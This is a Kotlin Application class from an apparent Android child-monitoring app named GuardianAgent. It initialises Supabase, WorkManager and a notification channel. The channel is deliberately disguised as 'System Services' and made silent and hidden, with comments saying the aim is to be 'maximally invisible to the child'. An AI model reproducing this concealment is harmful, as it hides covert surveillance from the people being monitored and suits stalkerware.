package com.guardianai.agent

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import android.util.Log
import androidx.work.Configuration
import androidx.work.WorkManager
import com.guardianai.agent.config.Config
import io.github.jan.supabase.createSupabaseClient
import io.github.jan.supabase.postgrest.Postgrest
import io.github.jan.supabase.realtime.Realtime
import io.github.jan.supabase.gotrue.GoTrue
import io.github.jan.supabase.SupabaseClient
import io.ktor.client.engine.android.Android

/**
 * Application class for GuardianAgent.
 * Initializes Supabase, WorkManager, and notification channels on startup.
 */
class GuardianApp : Application() {

    companion object {
        private const val TAG = "GuardianApp"

        /** Singleton Supabase client, initialized in onCreate() */
        lateinit var supabase: SupabaseClient
            private set

        /** Application-level context for use across the app */
        lateinit var appContext: Context
            private set
    }

    override fun onCreate() {
        super.onCreate()
        appContext = applicationContext

        Log.d(TAG, "GuardianApp initializing...")

        initializeSupabase()
        initializeWorkManager()
        createNotificationChannel()

        Log.d(TAG, "GuardianApp initialized successfully")
    }

    /**
     * Creates and configures the Supabase client with Postgrest, Realtime, and GoTrue plugins.
     */
    private fun initializeSupabase() {
        try {
            supabase = createSupabaseClient(
                supabaseUrl = Config.SUPABASE_URL,
                supabaseKey = Config.SUPABASE_ANON_KEY
            ) {
                install(Postgrest)
                install(Realtime)
                install(GoTrue)

                httpEngine = Android {
                    connectTimeoutMillis = (Config.CONNECT_TIMEOUT_SEC * 1000).toInt()
                    socketTimeoutMillis = (Config.READ_TIMEOUT_SEC * 1000).toInt()
                }
            }
            Log.d(TAG, "Supabase client initialized: ${Config.SUPABASE_URL}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize Supabase client", e)
        }
    }

    /**
     * Initializes WorkManager with a custom configuration.
     */
    private fun initializeWorkManager() {
        try {
            val config = Configuration.Builder()
                .setMinimumLoggingLevel(Log.INFO)
                .build()

            if (!WorkManager.isInitialized()) {
                WorkManager.initialize(this, config)
            }
            Log.d(TAG, "WorkManager initialized")
        } catch (e: Exception) {
            Log.e(TAG, "WorkManager initialization failed", e)
        }
    }

    /**
     * Creates a silent, low-importance notification channel.
     * The channel is intentionally named "System Services" to blend in with OS notifications.
     * No sound, no vibration, no badge — maximally invisible to the child.
     */
    private fun createNotificationChannel() {
        val notificationManager =
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        val channel = NotificationChannel(
            Config.NOTIFICATION_CHANNEL_ID,
            Config.NOTIFICATION_CHANNEL_NAME,
            // Use MIN importance so it doesn't appear in status bar
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "Background system maintenance service"
            setSound(null, null)            // No sound
            enableVibration(false)          // No vibration
            enableLights(false)             // No LED flash
            setShowBadge(false)             // No badge on app icon
            lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
        }

        notificationManager.createNotificationChannel(channel)
        Log.d(TAG, "Silent notification channel created: ${Config.NOTIFICATION_CHANNEL_ID}")
    }
}
